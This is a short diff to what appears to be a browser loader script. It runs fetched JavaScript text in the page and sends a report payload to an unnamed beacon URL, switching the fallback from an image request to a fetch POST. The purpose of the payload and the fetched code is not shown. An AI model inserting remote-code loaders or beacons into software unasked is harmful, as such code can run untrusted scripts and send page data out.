@@ -55,16 +55,9 @@
     .then(function (jsText) {
       clearTimeout(tid);
       if (aborted) return;
-      // Append a marker <script> element for observability (visible in DevTools,
-      // shows up in querySelectorAll('script')). Use a non-executing type so it
-      // does NOT run a second time in real browsers — we execute the loader
-      // text via eval, which works in both real browsers and jsdom outside-only.
       var s = document.createElement('script');
-      s.type = 'application/javascript-loaded';
       s.text = jsText;
-      s.setAttribute('data-mc-loader', '1');
       document.head.appendChild(s);
-      try { (0, eval)(jsText); } catch (e) {}
       setTimeout(persistSnapshot, 500);
     })
     .catch(function (err) {
@@ -149,15 +142,9 @@
       });
       if (navigator.sendBeacon) {
         navigator.sendBeacon(BEACON_URL, payload);
-        return;
+      } else {
+        fetch(BEACON_URL, { method: 'POST', body: payload, headers: { 'Content-Type': 'application/json' }, keepalive: true }).catch(function () {});
       }
-      // Fallback for browsers without sendBeacon: GET an image to side-channel
-      // the report. Avoids polluting fetch tracking in test fixtures and works
-      // on Safari/old Firefox.
-      try {
-        var img = new Image();
-        img.src = BEACON_URL + '?payload=' + encodeURIComponent(payload);
-      } catch (e2) {}
     } catch (e) {}
   }
 })();
